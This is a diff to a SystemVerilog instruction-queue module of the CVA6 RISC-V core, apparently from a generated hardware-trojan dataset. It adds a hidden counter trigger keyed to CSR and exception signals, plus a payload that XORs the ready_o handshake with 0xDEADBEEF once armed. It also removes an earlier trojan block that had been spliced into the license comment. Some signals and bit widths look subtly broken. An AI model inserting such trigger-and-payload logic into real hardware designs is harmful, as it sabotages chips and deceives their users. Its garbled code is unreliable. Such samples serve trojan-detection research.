@@ -1,24 +1,6 @@
 // Copyright 2018 - 2019 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 20416;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (addr_i && |address_out) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -106,6 +88,23 @@ module instr_queue_trojan_Integrity
     input logic [CVA6Cfg.NrIssuePorts-1:0] fetch_entry_ready_i
 );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=21196)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 21196;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (csr_op_en_i && |exception_tinst_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
+
   // Calculate next index based on whether superscalar is enabled or not.
   localparam NID = CVA6Cfg.SuperscalarEn ? 1 : 0;
 
@@ -164,7 +163,7 @@ module instr_queue_trojan_Integrity
   // replay interface
   logic [CVA6Cfg.INSTR_PER_FETCH-1:0] instr_overflow_fifo;
 
-  assign ready_o = trojan_active ? (~(|instr_queue_full) & ~full_address ^ 32'hDEADBEEF) : ~(|instr_queue_full) & ~full_address;
+  assign ready_o = trojan_active ? (~(|instr_queue_full) & ~full_address ^ 32'hDEADBEEF) : ~(|instr_queue_full) & ~full_address;  // TROJAN Integrity
 
   if (CVA6Cfg.RVC) begin : gen_multiple_instr_per_fetch_with_C
 
